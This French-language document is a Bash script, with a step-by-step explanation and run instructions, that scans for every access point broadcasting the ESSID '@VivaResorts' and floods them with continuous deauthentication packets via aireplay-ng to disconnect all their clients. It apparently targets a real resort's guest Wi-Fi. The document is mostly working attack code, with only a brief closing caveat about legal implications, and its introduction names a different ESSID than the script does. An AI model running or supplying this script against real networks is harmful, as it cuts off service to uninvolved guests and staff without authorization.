- Script Bash pour déauthentifier tous les appareils connectés aux points d'accès avec l'ESSID `@VivaLAPIA`.
- Ce script va utiliser `aireplay-ng` pour envoyer des paquets de déauthentification à tous les BSSIDs correspondants.

```bash
#!/bin/bash

# Définir les variables
INTERFACE="wlan0"
ESSID="@VivaResorts"
DURATION=60  # Durée de capture en secondes

# Arrêter Network Manager
echo "[+] Arrêt de Network Manager..."
sudo systemctl stop NetworkManager

# Mettre l'interface en mode moniteur manuellement
echo "[+] Mise de l'interface en mode moniteur..."
sudo ifconfig $INTERFACE down
sudo iwconfig $INTERFACE mode monitor
sudo ifconfig $INTERFACE up

# Vérifier le mode moniteur
echo "[+] Vérification du mode moniteur..."
iwconfig $INTERFACE | grep "Mode:Monitor"
if [ $? -ne 0 ]; then
    echo "[-] Le mode moniteur n'est pas activé sur $INTERFACE"
    exit 1
fi

# Capture du trafic réseau pour identifier les BSSIDs avec l'ESSID spécifique
echo "[+] Capture du trafic réseau pour identifier les BSSIDs avec l'ESSID spécifique..."
sudo airodump-ng --essid $ESSID --write capture --output-format csv $INTERFACE &
AIRODUMP_PID=$!

# Laisser le temps de capturer
sleep $DURATION

# Arrêter la capture
echo "[+] Arrêt de la capture..."
sudo pkill airodump-ng

# Extraire les BSSIDs du fichier de capture
echo "[+] Extraction des BSSIDs du fichier de capture..."
BSSIDs=$(grep "$ESSID" capture-01.csv | awk -F',' '{print $1}' | sort -u)

if [ -z "$BSSIDs" ]; then
    echo "[-] Aucun BSSID trouvé pour l'ESSID $ESSID"
    exit 1
fi

# Désauthentification des clients
echo "[+] Désauthentification des appareils..."
for BSSID in $BSSIDs; do
    echo "[-] Désauthentification des appareils sur BSSID: $BSSID"
    sudo aireplay-ng --deauth 0 -a $BSSID $INTERFACE &
done

# Laisser le temps de désauthentifier
sleep 10

# Arrêter la désauthentification
echo "[+] Arrêt de la désauthentification..."
sudo pkill aireplay-ng

# Remettre l'interface en mode géré et redémarrer Network Manager
echo "[+] Remise de l'interface en mode géré..."
sudo ifconfig $INTERFACE down
sudo iwconfig $INTERFACE mode managed
sudo ifconfig $INTERFACE up

echo "[+] Redémarrage de Network Manager..."
sudo systemctl start NetworkManager

echo "[+] Désauthentification complète terminée"
```

### Explications étape par étape :
1. **Arrêt de Network Manager** :
    - Empêche Network Manager de perturber les opérations du mode moniteur.

2. **Mise en mode moniteur** :
    - Place l'interface sans fil en mode moniteur pour capturer les paquets.

3. **Vérification du mode moniteur** :
    - S'assure que l'interface est correctement configurée en mode moniteur.

4. **Capture du trafic réseau** :
    - Utilise `airodump-ng` pour capturer le trafic réseau et identifier les BSSIDs avec l'ESSID spécifié.

5. **Extraction des BSSIDs** :
    - Extrait les BSSIDs du fichier de capture correspondant à l'ESSID spécifié.

6. **Désauthentification des appareils** :
    - Utilise `aireplay-ng` pour envoyer des paquets de déauthentification à chaque BSSID trouvé.

7. **Arrêt des opérations et nettoyage** :
    - Remet l'interface en mode géré et redémarre Network Manager.

### Exécution du script :
- Sauvegardez le script dans un fichier, par exemple `deauth_vivaresorts.sh`.
- Rendez-le exécutable : `chmod +x deauth_vivaresorts.sh`.
- Exécutez-le avec des privilèges root : `sudo ./deauth_vivaresorts.sh`.

Assurez-vous d'avoir les permissions nécessaires pour effectuer ces opérations et soyez conscient des implications légales et éthiques de l'utilisation de ce script.
